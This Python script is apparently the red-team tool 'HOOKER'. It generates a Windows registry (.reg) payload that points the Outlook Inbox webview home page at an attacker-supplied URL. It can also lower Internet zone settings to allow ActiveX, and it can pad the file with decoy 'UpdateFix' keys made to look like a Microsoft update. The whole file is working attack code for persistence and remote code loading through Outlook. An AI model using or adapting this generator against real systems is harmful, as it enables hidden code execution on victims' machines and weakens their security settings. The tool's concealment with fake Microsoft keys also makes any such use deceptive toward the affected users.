import os
import configparser
from optparse import OptionParser

def logo():
    logo = """
                                                     ██▓█▀
                                                  ▄███▓▓
                                                ▄████▒▒
                                            ▄▄█▓███▓▓
                                      ▄▄▄██▓▓▓███▓▓▒
                                 ▄▄███████▓█▓███▓▒
                             ▄▓▓▓▓███▓██▓▓▓████▓░
                            ▓▒▒▄▄▄▓▓██▓▓███████
                             ▀▓▓▓██▓▓█████████
                                ███▓███████▓▓
                               ▐███▓███████▒
                               ▓█████████▓▒
                              ▓███▓█████▓▒       ▓▄
                              ▓▓▌ ▓█▓█▀▀         ▐▓█▄
                             ▐▓▓ ▐▓▓▓▒            ▓▌██
                             ▓▓  ▓▓▓▓             ▓▌▐▓█▄
                            ▓▓▌ ░▓▓▒▒            ▐▓ ▐▓▓▓▄
                           ▐▓▓▌ ▒▓█▒             ▓▓  ▓▓▓▓▌
                           ▓█▓▒░▓▓▓▒   HOOKER   ▐▓▌ ░▓▓▓▓▓▌
                           ▓▓▓▒▒▒▓▓▒           ▒▓▀  ▄▓▓▓▓█▓▌
                          ▐▓▓▓▒▒▒▓█▒          ▓▌▄▄▓▓▓▓▓▓▓▓▓▓
                          ▐▓▓▓▒▒▒▓█▌         ▄██▀▓▓▓▓▓▓▓▓█▓▓
                          ▐▓▓▓▓▒▒▒▓█▌             ▐▓▓▓▓▓▓▓▓▓▓
                           ▓▓▓▓▒▒▒▒▓▓▓           ▄▓▌▓▓▓▓▓▓▓▓▓▌
                           ▓▓▓▓▓▓▓▓▒▒▓▓█▄▄     ▄▓▓▀▒▓▓▓▓▓▓▓▓▓▓
                           ▐▓▓▓▓▓▓▓▓▓▒▒▒▒▀▀▀▓▓▓▀  ▄▓▓▓▓▓▓▓█▓▓█
                            ▀██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▓▓▓▓▓▓▓▓▓▓▓▓█▓█▌
                             ▀█▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓██▓███▌
                               ▀███████▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓████▀▀▀
                                 ▀█████▓▓▓▓▓▓████▓██████▀▀
                                   ▒▓████████████████▀▀
                                       ▀▀▀███▀▀▀▀▀▀
                                  Version 1.0 - Oddvar Moe
"""
    print(logo)

class Payloads:
    def __init__(self, url, encryptionkey, version, activex, outputpath, junk):
        self.url = url
        self.encryptionkey = encryptionkey
        self.version = version
        self.activex = activex
        self.outputpath = outputpath
        self.junk = junk
        
        # generate obfuscated url
        self.obfuscatedurl = list(self.url)
        self.obfuscatedurl = '|'.join(self.obfuscatedurl)

        if self.outputpath:
            os.makedirs(os.path.dirname(self.outputpath), exist_ok=True)


    def gen_registry_hooker(self):
        print("\033[1;32m\n[+] Generating .reg payload\033[0m")

        registry_header_template = """Windows Registry Editor Version 5.00
        """
        if self.junk:
            junk_template = """
[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\UpdateFix\\Data]
"FixId"="ID5632124"
"Patchid"=dword:00000003
"EnableFix"=dword:00000001
"KeepOldUpdates"=dword:00000001
"KeepAliveSettings"=dword:00000001
"EnableOutlookFix"=dword:00000001

[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\UpdateFix]
"BugID"="142351"
"VendorSpecific"=dword:00000001
"LegacyIESettings=dword:00000001
"CloudTelemetrics"=dword:00000001
"AllowUninstall"=dword:00000001
"MSSupportID"="35612351-432123-5321231"

[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\UpdateFix\\Tenant]
"TenantID"="1baeav81-11a4-42cf-a038-5dab3902184a"
"TenantDomain"="onmicrosoft.com"
"LegacyAuth"=dword:00000000
"ModernAuth"=dword:00000001
"AADADFSAccount"="adfs_svc"
"""
        else:
            junk_template = """"""

        if self.activex:
            activex_template = """
[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ext\\Stats\\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"""
        else:
            activex_template = """"""
        
        # Version specific settings
        if self.version:
            settings_template = """
[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\""" + self.version + """\\Outlook\\Webview\\Inbox]
"url"=\"""" + self.url + """\"
"security"="yes"
"""
            if self.encryptionkey:
                encryption_template = """
[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\""" + self.version + """\\Outlook\\UserInfo]
"KEY"=\"""" + self.encryptionkey + """\"
"""
                settings_template = settings_template + encryption_template
        # Not version specific settings
        else:
            settings_template = """
[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Webview\\Inbox]
"url"=\"""" + self.url + """\"
"security"="yes"

[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\15.0\\Outlook\\Webview\\Inbox]
"url"=\"""" + self.url + """\"
"security"="yes"

[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\14.0\\Outlook\\Webview\\Inbox]
"url"=\"""" + self.url + """\"
"security"="yes"
"""

            if self.encryptionkey:
                encryption_template = """
[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\UserInfo]
"KEY"=\"""" + self.encryptionkey + """\"

[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Office\\15.0\\Outlook\\UserInfo]
"KEY"=\"""" + self.encryptionkey + """\"

[HKEY_CURRENT_USER\SOFTWARE\\Microsoft\\Office\\14.0\\Outlook\\UserInfo]
"KEY"=\"""" + self.encryptionkey + """\"
"""
                settings_template = settings_template + encryption_template

        registry_template = registry_header_template + junk_template + settings_template + activex_template            
        return registry_template


    def gen_outfile_registry_hooker(self):
        f = open(self.outputpath+'/hooker.reg','w')
        f.write(self.gen_registry_hooker())
        f.close()

def main():
    logo()
    usage = "Usage: %prog [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-c", "--config", action="store_true", dest="config", default=False,
                      help="Bool: When set it will look for specConfig.ini, parse settings and generate payloads")
    parser.add_option("-u", "--url", dest="url",
                    help="The url you want to add to generated code samples. If you are using prestaged url's also use the -e or --encryptionkey option"),
    parser.add_option("-e", "--encryptionkey", dest="encryptionkey",
                      help="The key to use if you are using prestaged url's")
    parser.add_option("-a", "--activex", action="store_true", dest="activex", default=False,
                      help="Bool: When set it will also generate the needed settings for ActiveX to work")
    parser.add_option("-j", "--junk", action="store_true", dest="junk", default=False,
                      help="Bool: When set it will also add unused junk settings to registry")
    parser.add_option("-o", "--outputpath", dest="outputpath",
                      help="Path to export the output from the tool. If not specified it will print to screen. Will create directory if not existing. Specify with /root/folder/")
    parser.add_option("-v", "--version", dest="version",
                      help="Specify version of office, if not set it will include all versions. This only applies to .reg files. Specify with 16.0 , 15.0 , 14.0")
    #Add option to parse the config file...
    (options, args) = parser.parse_args()

    if options.url is None and options.config is False:
        print("\033[1;31m[!] RTFMException: Either use bool config (-c) to parse specConfig.ini or manually set url (-u) and other options. Use -h for help. Geez!\033[0m")
        exit()
    
    if options.config:
        config = configparser.ConfigParser()
        config.read('specConfig.ini')
        options.url = config['DEFAULT']['dns_name']+config['DEFAULT']['validate_url']
        options.activex = True
        options.junk = True
    
                
    
    print("\033[1;32m\n[+] Generating payloads\033[0m")
    payloads = Payloads(options.url,options.encryptionkey, options.version, options.activex, options.outputpath, options.junk)
    if options.outputpath: #Write to files
        payloads.gen_outfile_registry_hooker()
        print("\033[1;32m\n[+] All payloads save to {}\033[0m".format(options.outputpath))
    else: #Print to screen
        print(payloads.gen_registry_hooker())
        print("\033[1;32m\n[+] All payloads printed to screen\033[0m")
    
if __name__ == '__main__':
    main()